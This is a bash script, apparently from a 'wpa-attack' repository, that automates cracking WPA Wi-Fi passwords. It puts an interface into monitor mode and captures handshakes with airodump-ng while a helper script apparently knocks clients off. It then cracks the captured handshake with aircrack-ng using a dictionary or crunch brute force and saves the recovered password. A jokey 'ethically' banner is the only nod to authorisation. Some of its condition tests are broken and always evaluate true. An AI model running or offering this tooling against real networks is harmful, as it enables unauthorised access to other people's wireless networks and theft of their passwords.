#!/bin/bash

MONITOR=mon 
CAP_DIR=./captures/ #Directory where you will want to store your captures 
DIC_DIR=./dics/ #Directory where your dictionaries should be
PASSWORDS_DIR=./passwords/ #Directory where your passwords will be stored
CAPTUREMORE="y"

echo "  __________________________           __________________________"
echo " <  let's crack, my dude!!!! >        <   ethically of course    > "
echo "  --------------------------           --------------------------"
echo "              ^__^   /                    \   ^__^ "
echo "      _______/(oo)  /                      \  (oo)\_______"
echo "  /\/(       /(__)                            (__)\       )\/\ "     
echo "     | w----||                                    ||----w |"
echo " \|/ ||     ||       \|/                \|/       ||     ||     \|/ "
echo "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
echo -e "\n\n-This code was written by @milenacsilva"
sleep 5
clear

echo "++++++++++++ Do you want search for accesss points near you? [y/n] ++++++++++++++"
echo "|                                                                               |"
echo "| Obs:. this option will deactivate your internet for a moment, but dont worry  |"
echo "|as long as you dont kill this program, we'll have it back up in the end again  |"
echo "|                                                                               |"
echo "|                                                                               |"
echo "|                                                                               |"
echo "| If you already have a handshake cap to analyze you can skip this ヽ༼ ʘ̚ ل͜ ʘ̚༽ﾉ  |"
echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
read AIRODUMP
  
if [ $AIRODUMP == 'y' ]; then
  clear
  read -p "Okay, but before we start are you sure you're running this script inside your cloned wpa-attack directory as the root user?[y/n]  (╭ರ_•́)  " DIRCONFIRM 
  if [ $DIRCONFIRM == "n" ]; then
    echo -e "\n\n\n(Ͼ˳Ͽ) NANI?!?! then what are u doing here???"
    sleep 2
    clear
    echo "Come on, go there, i'll wait  ( ಠ_ಠ)"
    sleep 1
    exit
    else
      clear 
      echo -e "Nice job ＼(≧ ▽ ≦)／"
      sleep 1
      clear
      echo "Starting script.."
      sleep 2
  fi
  clear
  echo -e "++++++++++++++ Please select a interface to start monitoring ++++++++++++++\n"
  iwconfig
  read -p "INTERFACE: "  INTERFACE
  clear
  read -p "Are you sure you wanna continue?[y/n]:  " CONFIRM
  clear

  if [ $CONFIRM == 'y' ]; then
    echo "Killing all runinng processes..."
    airmon-ng check kill
    sleep 3
    clear
    echo "Starting $INTERFACE..."
    airmon-ng start $INTERFACE
    sleep 3
    clear
    while [ $CAPTUREMORE == "y" ]; do
      echo "Searching for all available access points..."
      echo "Obs:. make sure to press ^C when you find the access point you  want to go to the next step"
      sleep 8
      airodump-ng $INTERFACE$MONITOR
      echo "----------------------------------------------------------"
      read -p "ACCESS POINT NAME (This will be the capture name): " FILENAME
      read -p "CHANNEL: " CHANNEL
      read -p "BSSID: " BSSID
      clear
      echo "Starting airdump..."
      echo "Obs:. make sure to press ^C when you get a handshake or to kill   the airdump"
      sleep 8
      sudo gnome-terminal -- ./disconectclient.sh
      airodump-ng --write $CAP_DIR$FILENAME --channel $CHANNEL --bssid  $BSSID $INTERFACE$MONITOR
      clear
      echo  "Good job! Saving files now..."
      sleep 3
      clear
      read -p "Do you want to capture another network/channel?[y/n]" CAPTUREMORE
      clear
    done
    echo "Restarting your network..."
    sleep 2
    service NetworkManager restart
    airmon-ng start $INTERFACE
    airmon-ng stop $INTERFACE$MONITOR
    ifconfig $INTERFACE up
    else
      echo "Skipping.."
      sleep 2
  fi  
  else
    echo "Skipping.."
    sleep 1
fi

clear
echo "+++++++++++++++ Do you want to crack the handshake file already? [y/n] +++++++++++++++"
read AIRCRACKCONFIRM

if [ $AIRCRACKCONFIRM == 'y' ]; then
  clear
  read -p "Chose [1] for aircracking with a dictionary and [2] for crunch: " CRACKMETHOD
  if [ $CRACKMETHOD=1 ]; then
    read -p "Enter dictionary to be used: " DICTIONARY 
    echo "Loading dictionary..."
    sleep 1
    read -p "Enter capture file (don't include the extension): " CAPTURENAME
    echo "Loading capture file..."
    aircrack-ng $CAP_DIR$CAPTURENAME.cap -w $DIC_DIR$DICTIONARY -l $PASSWORDS_DIR$CAPTURENAME-password.txt
    elif [ $CRACKMETHOD=2 ]; then
      if [ $BSSID=0 ]; then
        read -p "Enter BSSID: " BSSID
      fi
      read -p "Enter capture file (don't include the extension): " CAPTURENAME
      echo "Loading capture file..."
      sleep 2
      read -p "Enter the minimum length: " MIN
      read -p "Enter the maximum lenght: " MAX
      read -p "Enter the charset: " CHARSET
      echo "Loading crunch..."
      sleep 3
      crunch $MIN $MAX $CHARSET | aircrack-ng -b $BSSID -w - $CAP_DIR$CAPTURENAME.cap -l $PASSWORDS_DIR$CAPTURENAME-password.txt
  fi
      clear
      echo -e "Done cracking.\nSaving password....\n\n\n"
      sleep 5
      echo -e "Congratulations!!!\nYou are a true ethical hacker /ᐠ｡ꞈ｡ᐟ\  but pwease don't hack me"
      sleep 3
      clear
      echo "The file containing the password has been saved to the ./password/ directory"
      sleep 3
      echo "Exiting.."
      sleep 5
else
  echo "Exiting.."
  sleep 5
  
fi

echo "Byee, come back soon pwease （✿ ͡◕ ᴗ◕)つ━━✫・* "
exit


